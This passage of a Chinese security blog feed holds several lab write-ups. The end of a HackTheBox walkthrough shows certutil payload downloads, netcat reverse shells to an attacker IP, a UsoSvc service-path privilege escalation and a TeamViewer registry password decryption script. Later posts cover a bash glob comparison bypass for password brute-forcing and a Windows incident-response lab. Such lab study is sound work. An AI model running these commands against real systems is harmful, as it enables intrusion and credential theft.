<p>是成功的，接下来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>下载一个nc到靶机，再调用，本地开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>上传辅助工具winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>解出密码:!R3m0te!</p>
<p>测试这个密码能否登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>sh脚本中==判断的几个情况</title>
    <url>/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
<p>这个东西有点抽象，群主当时给了例子</p>
<p>我自己复现了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>

<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
<p>肯定不止这个用法，后续待更新</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-editorial复盘</title>
    <url>/2024/06/19/htb-editorial%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1f921fbbff15c551a8e36907d0392b10be414ddb13375860e513c883c33aeb64">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c228ca43a8b7d26a1f93493ca3bcd37995a12b9b08d166b59923d687351280fae2b9f7a44bdc0f0f68965f100b64ec3f627364825ad97be1928b3365ba8136189009815fa798620c07e34b5e5f0570847edca367d8dce05442c88b37d61feb28a1c223668efdfe46f80f75b08af0db0af25625315516a4f2e8f970ec8fd430e7df1ed4e9914c8bb51f3f17bc5a8e6676b3b8d257ae946b3723aa9b26dd34276e5a0da1a3da5568d6c4e2cedd92132d2c79466b85c8f58ed06ad5e46f793e239e7375f24cd2df2cec775dbde5dd2269c05913bb6b82676b7afe0f6ec8e11324274845b2fbfc4a205835d03e8b5530e0a51bdfe03fb10352b449bdbe7292978e7ff1196aedc29226d2d69d702d9863b1002a00b4bce756da0cd90f3187f109206be9efd4212f2912eeb9faf30e1242bd0a6891de8d4a022089217fd60337cbd02493d2a31b9fdab3b04d3e52075d649801efcf14fc9e0181ff33a613a50d0de0963d9569c757d787cd2281750ccafe2d30187578b5263ad4ed1f2e100c1dae7c4759850262e10330148ab56fb8b692aa4d27ef67335e37c7b25802d5088f1a6fab9ba1010bd744cb209997c32c99531deeef2299722fef724919a6b0c12c985b80ed8cdebfae942b5d3a8dda2463799d38184b1679893314cd37286b2e2fbe48bc90553728377398ae98fd58816b53291b8aba5dd10618d30a6d0c14bfcb0867bdeb3f1670ed5a1d39bd975ae70764792821eb7234e91487beda0128a6dcc94a9a7be9a6263614ebfebec47757b94df8b70125719af900edcc4603e999399e5dd1dc0b30a5710c31d8dd44b90ca9bb77564e574a70a2f8c610b9d800208f8c2e6e85e39655b87333588149484825fb3543f5cadcce60993bcb33f116b207d29947a1266869f83c5122d8806325674577d09f743cac2043df2a888703cad4c0d4d115904d31e6b7c73c1248be2e9581363d794175d57d958fedc8c10b3a2896be5527830790bd133a2c02e17ca599d6cfd07879c8622d8e82c194bd9de1c33bf9b4a8bcbd313b649c65c5a19d1bdfab7dc7ef330bc68e6a140ff3e8a2a50334693736a0c9944b40c4be4ab35b6ea62a079b246e7995836febd0ec3980609fe47114549d815b6487363639cf1eaca255f37d7805e66d5480f280242a4fe2a5f77ff62fb7ac2f0c32b8ac81c0d8ab907834c71c6db1d5063eb5a8496386d9ed300f8f01c25c1b4efa9b2b064a9b097358b97cc8876f30fbec2067ea7f076eced0a14a20515d14484bb1f599f11f4c063a94acc1514ec1bdd9fddc10cf2efd665ba7cf342225c14d33903401499ac35097c8fd7e9af3d2059e32b877e644e6300815292e974d135ecd9630b3f19aaaa267488d5158c510a3a9a4fc21719698b2c1d4524d8a55f1acf87aa39fc01d5f344aeef640a4f98930d2e855736c7b945be61e3121ceaafe4b7996c0b0ada67a5100c4090aa5aef99837b634da6931ee62711a2a6eb9696b35e5cef37b1f20685f97a65d0d5d62a72d1066f930065aa794722973976bf3804619bedc0533fbde0f5bd7781a55aab3841431481337153fc5ef3bb2802c615b4ef8baeece20670dcc93c6ab3885efbd87be7fb7cda70d165247d8744de3e3d7c97955ad83e4b6bccc2619dce56b3ef8ba89b5cfcd01642d5995982478432fd83608ff62df2a2bd9193feb462447375adb1d0bab66079f5273c81d9e5aea1314a7217b71d7baf48c4b2a235e4f443f88c6bdc8f62dd8f4b30f4987b931b765cc810c49047d1a298d50477ded1e4ed1804f216ca3a19e82e2c2489a7319978a2459cfb59e79bf8703280d35dd7ee5b82f88bf07bef566081990f5ee24200f20e59c42649201ade30d76cf64a4bb07b61616267977af51a509bcd9610290f85ba87d91d7d97aa0cc692e435e054746c05eb61fd7d250dcebee0f16dc69b0f8a90db500d60900c3615350fdf05533ce471e6fe9a4c4b98f9823b0815f1b1d65bd34f84e114a288ab346a39d08821ea5b07578777a63afabea9f82a59fc9e051454ea64d5bbb6f4584cfbb202372a41009d9b1794aac745fc27914e5da4d5e0000aa66eddd8d31b47e58c5a17771b5ba8aa68df261af92912202e5ecebe2eb443260a553fcedb3003e4431d4db4095208c93b5539fffbc17f86927387870402fe282d45c8776f24ed67bbe9512d45f65dbabcd601fa62b68d2ed1212a3e1d5dad8723846840f7e7b6c24bb422600acd26d82f76b688ea155015ef7a5cdbeee387b7a8cee3f3f7d4ae4a9a5e421a2db6cc2f06bc6c26e8ddebd4c8ad27ab6cc486efbc94cf46896845c8db97a28c1b091571f1f44157e09476afa7b29e19a80193d10b9402da6f48473e9b79176ff5f2eaaeb9b639457db2885c71ce790b3f4b72fec20ed8c7182d92c24f55c2ae159d39acca0011eb67759d30e773df5874cf15bb94541e2a6975b5c622f397ff48e773aee739f0cdb02f64342152b0f4a6418cf42a25d89159032fc175a090f646682651ba8e0d6e48f748d16c6f685a4cc2f36671d0d4c87987821f5f198075eb5d75309dc0d64e9ae0b9977b1be626e4efb3f1c76469495f681b450fd78f3124919bdff066f2877caf9ebf2703c62de9537c07bc2ac77cf2a238ec50411acd40364ee6e7f8d0120de5661114b95163627b8f226beadb3738cc29ea078c3047f4293d28f4c7c44841915b5de99311cde785c221e6e41ed9a29588eeb6a6c44200554a14a74d7df9437edd70f9c501274448781e15dc6946942937b4135a2229dc1edb284e5225cd4212b044ceffdc09940cd4df71ae525993e47b1ea25c1490e484d1597d6fdd92bf04745a05fa01decd79cd739576627ad54d251b2f3b467c391aca7d8550455caf00f604b90b6d232841a873c18eaf25e4b6735f0b440d1e22b28c2eaa0b9481346a60c921c96413012254d9d26823f9a52fd020e8024dc16d01ba46772ab65c813a193a8b2bae580ae8e933c776656b9ed56bb251b41c671ae3b1f895807d1b7ca0354fb5b985893ff5f0fa8fa87b630e51d1b3379c5618854d5e17abb4a6bfb2c066b2857aaeb03ac068c2e5d465dec7ffca6c99934839e41fd23ea243bcab34e25421948aea7497e97ea706b4da94188634b8a58edb3fcfc12dbddf27513ed77b86beb9fef9f86838f5634e17b926bf92d3f57b6fbd8ce6d581c1891cea5c68595ff5f529747baee59103767463497ee6996d854193357195371fd5c42264925919373cf78f1d93f5a94f88c5bd6cafbc870a2534a8b627539f1a9a2602cb0ea83450d9ec3a9ea7a3b762237f57d464d17666ac7821b685620663cbd38292ddf34e93b366091c819c4adc8b305ada6f7003899e813affe3ffaf9ba08b228d4bd53a9ee70fa294d321e27ee4e4ad05d9665d4af935fd55746718755f41be6f309950ebd4eb9258609655b6cf50eac37a26d82466d95c1f77c43cd1463683dfa0329fac30f76edb5d91db80f3d3767556a0441e31a08a6f069abbba522eb886244d39f2107ac4304acfeaa0d6fbfcaf76500134ab71c9f5114b7661f39bea7e842641a4f222402c7358a213135f49d8d2238ea232837fcabb27e19206a82f8aa6c093b39fd65438d448f785e49c4ab53d769e8a01d5db42115b77a4c69516d5b48100d982f4aed4545530c9efb79d501c248385e6c461f9dc0d3a1b2b87c91f90f9bef8be386ccf681e7403f6b09d2bf2383486e4cf336aae791dee54c71db5b4ad509c3e41383323397277a6abe7c7bab9b9e2c6ee410737a6992abaa31f85a07855af4e156d05455ee7e73148aee046b631f45b8435960a463601121f8b4999295ed643e3610122b7de62cbd3e5b3621f3cf56fef37c552e586b262d0188d191bb634e985f3394ec5b345b4eea3c1e7355a290024dafc8151982e969204e8265f8a463b7d837cbe085ceaea42ffd37f22d4f3c413db42cd79643d1faad8cdce2bca5d5e04fbeb133cb72d658452ded410c566937cea38b6d8397ba6be710f9f283419e0276be07756b326103690b6d11e913ee5979cd65cda169f35d55f40cd62819db0de39fbf09b9a3baf7d75e77a753ecfdc14636e3c2f606303efcf6d80d41768fa450e0090dcca7295cac63c57293839b7b3997fb828cc75d9ecc8049a450c38f2af860765863ebcef36daff903af3a7a1e33184989f238e6a75444b276683cd5b5372c2c8930127aabbece31f349a174616bb653a8ab438263c0cdd26d1260feb3778c0b13bc61a31e5edd9f4b1c5e4bbfd21d7c832df6f0606c8bfa8a2e8d9f3275b7bb3ad66862406298b1599361dd480ccf4b6133395b5046e3643eac2d448eb0608deaf0e2d3cddb462e3240847cf13a1e71f81d99efb3429c9b0e1bbb630d47b3e05b9631fae712f6640bd89594020421ad2d6aa3cf2e2f3380605f8180e950310ef019e95e6c403ba94c03de62fb21c135f3c37d17baeb804890944027dd78e60753bbf0a5702d790455dc81d9ec78bbc7f6f5af64d6e236a18495ca21797da3bef14ac3b26f380c8f35102eb42897fb7b6c71fb01c65e1c85982a71938848689773f42dad6ceceef5dbe85a6eb043378f3735bf7c68bf5874464b5ec3c46356f98c124bd2d49672cc05eb2fc8a1a5c7a7e30dfd5b3dd73e820633735bc49baee77e445eb38b22446a02a1178f238cd1561c1b206748c0db33d6a4cbb70324e1d5e26e16f3539684c0207f824e048db4252152c97ba71c61be565f24935511243bdf7104f9b3f35ff36226a82c649a5e255dfd4f2979034c06624658734de4e61f3413156823d321710e2076c7931d7d65f25475078ad1dbdcbf658f2f84210520ddb9b083d18a1c8fef3c8a1903d8cf30e26ecdbeb5884125b16efda25bb7210b7b34ecaec3bb2640efb9c52eb4cd63dea558f44f6a956038b9f393288272d67070e38a879cf8765fa9dbe992a88d38abfbd4ecc521051d2190c1b0bce3e40ce16a960ee162bb655ff5f3164c448ad59ac70ec6f207c09bb5cedd73fad65f23c8ca8c71ae4d6bc48c98a8b6903862299929336681e90a1a12c0dac9661a3dbd0ed4020c407efed17cb1bdc5a43a541ab08a2d500aeb9f587c1165d1c53d4fdc8c76e2fe5cb9eb72e03727e75ff5c7d55101279849be93a14c89821c996c78ef661afa9e21acec30d1ff312e4a32fe8274e5360bb4b5258c65706d2dcedcc816b6ea0ab4a52fba9798db33ddc98d646fcd2c275db029e2047a89eedcdb9a93febbbd48830582321a08459c6b1a8dcbe9c844832b2365a213ac60ea72454b7667682e259a0f91edf64af477ffb4c200e6d4fe2d6037b714b2ea0e5f7d98a128b3517cbd78f4962dea4248926ed5915b9b2662cc734ea48a8b28dc215ad21a509b0265cf0e63ee7892e5eec887c8c782812c18cedeb534061739221a0afb7f518d38650ba8855d1fd378d8a0ab1e5ee94ad597524e5a91e1e0d2f2494c539ee8a4ee08abc16571610376002b2bb9919854b54349347e58644ca966b6174809c703c16aa22fdcbd824ebd7d9bef071da68fef34d803216949415f0507bd3e9212ba9e77410af0e22cde110832889689f1dcc7e9ba290b9eaba719e457440f9ba1290e5f876b96520a2a9047a1f98b83bf204038c65574e60b16b384bdfe4c15655ca82cc228621f3cfd6bb8f1b676eafc3818ceb8c2e71d1dd256fcac044606ac7b26a5c91bd7b948ef0ed19b68d517b9bae21c03da437a9d01920eac393f19d32dcc3175a3b707f800b8ae176660e073624260ff8f413c9513c5d354eb5969495e82fc135a61796cbe5cac97f3e38e0d985a20de5e05b3292e5ebf105dbbec24bd9586b1c505544e8552623d540862b07083a54a16e254bb9ae5d566e224fe6431ef11c4160374e04aa5275e5f59ec51d57fd5fc5dfdc6af512a48575eec4f08db09a976b9daa2e75f6c8184aa41ce5ea0853cd9bd02da93ac89ad167ed6c53a186313bf48fc374b70dbb55c5f5b46caa343ee6561b826b8803abcbb0ddb55693b1b4db30bcaf36ac6d23ab150b9721c607d6399a4f461fcb4e9f774e7b2460ebcb05c77c4b9bd3c986f06180b141485bb4f969c1fe6af5f4e759e3bd19cd23ec697bd3ad9fb9c69ef028a50e77053df3316ae48eb771eb4736e7e66e5e6b8afd24aa20c7633d75433a40f3d9d3c3222c14b218a8202fc2b951e29201f2a175075388225d7e968dad1c7a273daf5a509bf7c3ace25b856321a3cd0afec8cb635385158bb24cb6f69b815540b930b2d843350088d1c85017e4ff47495bff9a01105b248872bffd18f294ddc0a03cbba68ab3c277d02431824254e2b991f94dbaa88c91c9c7fe4abeb6f5dcfb32c144bb98827e6e41742fd72372089550680813dd05fa65f1d4d8583667c5fd9ae98bf11fdcad8e5ad3232ded82de1ed5f2796f8d2632aad0bbe6275f78f124351f6f17238521c76591cb7df5f456b0e4376c816ffb9763d2f9f27277de5834ab1f8dd9dffc78f60bb0c21218cd254e621f847f37349271201a5c7fedad0a633271b33050f50b613f33a2efc66531f2356d9368b7f2537e8a53a969a7c2de856ce66f54968836e1f6f45bab316064663c54996f802bb8cb48d8d1ceed44d3b991e40afc0241c35da01ededc319cc14bd6c2cabc3afe514b382a13267103cb12da6b89d2368653e188e3568a4d85fcf86e5df654904508e2d01225cdce64b372cc8ee03e116f5d2185236a0d4be24313ad6162942332b98432d5a9c95665950b2c9a01bb357df2bc665c6f84cf6163a7c73bbd35510155ebc380af5086853c2da99997c1ce3be0229e4b005db1369f31b1c80bc2ad38634f506dfd2029e9ad2e24b1d6fc72613896b2e59d5a04919fb0d17340f78929b8d0c6679ca294339a9d21db19d2ad7005f8d72c317f2b040191aeecacb97cb1ece5dda0512a0e2aa3b6eed3fca02acff11b02f58cfc15eed24f1ea1a03d1b3f588d6a257ebbad2e0e742158ebe845b298e16c038ccde80ecb30667e432b80a4e054a596aba6b480b9d941f42c5949f0d5c318477b52674b19ef5203c47465d0964e73a5f761722869a681a418d07d3e055d0881d7a3100a1483c99433687185f8fa5de58c0795e6883ee14aa6ddfa0826f501583a47fc63c5d1535403cb1e218782f358b05940841c18e830715e7e233c59d38256231c2de7c88f52e00aa1ed583cdcfcd2c9971ded50e2d066c81ee3bf9d064b2d6e6c3e0fdb1bc7579143aba65c655dd4844a1b3d17e877263019b51f6dc6ee457281b665163d6d57b171ba9e5d9628be06f945aac8dbe6778d5bf5fcf3cb3d7e3c0f6d4205d3abba73d6b4496c3b69e9540cfb8bdacfac0811dfa37765d9cfeca0be12d348515d03c08b416d1fd4d96f517a465b22e5fe686868f3622209c68bcf7eced08a5b17725bcf28c04923a8344a873a79fca58696563031786dc93ec4f2a7d718fcb8d062f1007555de5e909ca9b195023380904774b35600004442688fe6d6484f3b9d6adfaea5c8a4e811e03ff37cf0e0487b40d07b04fabdb450af3c70b24d90b79b8ecd03acff9f023b366d4e3883b216f2411ee031372</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机-windows实战</title>
    <url>/2024/06/01/%E7%8E%84%E6%9C%BA-windows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h3><p>先远程桌面连接，用微软的remote desktop还挺方便</p>
<h4 id="找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h4><p>用d盾查杀，找到shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143330.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141231.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141541.png" ></p>
<p>这种就是看日志，找到phpstudy路径下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141733.png" ></p>
<p>随便一看就是192.168.126.1这个ip一直在访问shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交"></a>分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交</h4><p>思路可以看用户表或者直接看用户目录下多了什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142716.png" ></p>
<p>有个hacker138</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142902.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

